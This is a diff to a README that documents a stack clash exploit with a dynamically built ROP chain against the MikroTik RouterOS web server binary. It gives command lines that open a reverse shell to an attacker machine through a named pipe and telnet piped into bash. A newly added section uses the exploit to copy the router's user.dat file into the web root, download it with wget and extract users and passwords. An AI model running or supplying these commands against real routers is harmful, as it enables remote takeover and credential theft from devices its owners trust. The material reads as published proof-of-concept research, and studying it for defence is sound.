@@ -19,7 +19,7 @@ Stack clash exploit using two threads, missing ROP chain
 ## StackClashROPSystem  
 Stack clash exploit using two threads  with ROP chain to run bash commands  
 
-For a reverse shell:  
+### For a reverse shell:  
 ```
 $ nc -l -p 1234
 $ ./StackClashROPsystem.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"
@@ -27,6 +27,13 @@ $ ./StackClashROPsystem.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/
 Where:  
 - RouterOS IP: 192.168.8.1  
 - PC IP: 192.168.8.5  
+
+### To extract users and passwords
+```
+$ ./StackClashROPsystem.py 192.168.8.1 80 www_binary "cp /rw/store/user.dat /ram/winbox.idx"
+$ wget http://192.168.8.1/winbox/index
+$ ./extract_user.py index
+```
 
 As the ROP is dynamically created, you have to extract the `www` binary from the RouterOS firmware.   
 (It's placed in `/nova/bin/`)  
